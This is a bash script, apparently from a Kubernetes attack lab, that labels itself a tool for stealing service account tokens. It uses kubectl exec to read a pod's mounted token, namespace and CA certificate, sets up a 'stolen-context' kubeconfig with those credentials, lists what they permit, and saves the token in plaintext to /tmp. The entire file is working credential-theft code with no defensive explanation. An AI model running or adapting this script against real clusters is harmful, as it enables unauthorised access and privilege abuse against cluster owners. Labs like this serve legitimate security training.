#!/bin/bash

# Script to steal service account tokens and use those tokens for access

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
POD_NAME="${2:-}"

echo -e "${BLUE}=== Stealing Service Account Tokens ===${NC}\n"

# If pod not specified, list and select
if [ -z "$POD_NAME" ]; then
    PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)
    
    if [ -z "$PODS" ]; then
        echo -e "${RED}No pods found in namespace $NAMESPACE${NC}"
        exit 1
    fi
    
    POD_NAME=$(echo $PODS | cut -d' ' -f1)
    echo -e "${YELLOW}Using pod: $POD_NAME${NC}"
fi

# 1. Get service account token
echo -e "${YELLOW}[1] Getting service account token...${NC}"
TOKEN=$(kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)

if [ -z "$TOKEN" ]; then
    echo -e "${RED}✗ Could not get token${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Token obtained${NC}"
echo -e "${YELLOW}Token: ${TOKEN:0:50}...${NC}"

# 2. Get service account namespace
echo -e "\n${YELLOW}[2] Getting namespace...${NC}"
NAMESPACE_SA=$(kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
echo -e "${GREEN}✓ Namespace: $NAMESPACE_SA${NC}"

# 3. Get CA certificate
echo -e "\n${YELLOW}[3] Getting CA certificate...${NC}"
kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > /tmp/ca.crt 2>/dev/null
echo -e "${GREEN}✓ CA certificate obtained${NC}"

# 4. Get service account information
echo -e "\n${YELLOW}[4] Getting service account information...${NC}"
SERVICE_ACCOUNT=$(kubectl get pod "$POD_NAME" -n "$NAMESPACE" -o jsonpath='{.spec.serviceAccountName}' 2>/dev/null)
echo -e "${GREEN}✓ Service Account: $SERVICE_ACCOUNT${NC}"

# 5. Create new context with stolen token
echo -e "\n${YELLOW}[5] Creating context with stolen token...${NC}"
CLUSTER_NAME=$(kubectl config view --minify -o jsonpath='{.clusters[0].name}' 2>/dev/null || echo "stolen-context")
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || echo "")

if [ -n "$SERVER" ]; then
    kubectl config set-credentials stolen-user --token="$TOKEN" 2>/dev/null
    kubectl config set-cluster stolen-cluster --server="$SERVER" --certificate-authority=/tmp/ca.crt 2>/dev/null
    kubectl config set-context stolen-context --cluster=stolen-cluster --user=stolen-user --namespace="$NAMESPACE_SA" 2>/dev/null
    echo -e "${GREEN}✓ Context created: stolen-context${NC}"
fi

# 6. Test token
echo -e "\n${YELLOW}[6] Testing stolen token...${NC}"
if kubectl --context=stolen-context auth can-i --list 2>/dev/null; then
    echo -e "${GREEN}✓ Token valid and functional${NC}"
else
    echo -e "${YELLOW}⚠ Token may have limited permissions${NC}"
fi

# 7. Verify permissions
echo -e "\n${YELLOW}[7] Verifying service account permissions...${NC}"
kubectl auth can-i --list --namespace="$NAMESPACE_SA" --token="$TOKEN" 2>/dev/null || \
    echo -e "${YELLOW}   Review permissions manually${NC}"

# 8. Save information
echo -e "\n${YELLOW}[8] Saving stolen information...${NC}"
cat > /tmp/stolen-token-info.txt <<EOF
Service Account: $SERVICE_ACCOUNT
Namespace: $NAMESPACE_SA
Token: $TOKEN
Cluster: $CLUSTER_NAME
Server: $SERVER
EOF

echo -e "${GREEN}✓ Information saved to /tmp/stolen-token-info.txt${NC}"
echo -e "${YELLOW}To use the token:${NC}"
echo -e "  kubectl --context=stolen-context get pods"
echo -e "  kubectl --token=$TOKEN --server=$SERVER --certificate-authority=/tmp/ca.crt get pods"

echo -e "\n${BLUE}=== Token Theft Completed ===${NC}"
